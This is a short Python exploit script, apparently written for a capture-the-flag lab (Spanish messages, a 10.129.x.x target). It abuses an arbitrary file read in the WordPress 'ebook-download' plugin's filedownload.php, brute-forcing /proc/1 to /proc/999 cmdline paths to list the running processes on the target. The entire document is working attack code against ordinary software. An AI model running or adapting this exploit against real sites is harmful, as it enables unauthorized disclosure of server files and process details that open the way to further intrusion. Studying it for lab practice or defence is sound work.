# !/usr/bin/python3

from pwn import *
import requests, signal, time, sys, pdb, time


def def_handler (sig, frame): 
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# crtl + c 
signal.signal(signal.SIGINT, def_handler)

# Variables

main_url= "http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

def makeRequest():
    
    p1 = log.progress("Brite force attack")
    p1.status("Starting brute force attack")
    time.sleep(2)
    
    for i in range (1, 1000):

        p1.status("Trying PATH /proc/%s/cmdline" % str((i)))

        URL123 = main_url + "/proc/" + str(i) + "/cmdline"
        
        r = requests.get(URL123)

        # print(len(r.content))
        if len(r.content) > 82: 
            print("-------------------------------------------------------------------------------")
            log.info("PATH: /proc/%s/cmdline" % str((i)))
            log.info("Total lenght: %s" % len(r.content))
            log.info(r.content)
            print("-------------------------------------------------------------------------------")



if __name__ == '__main__':
    makeRequest()







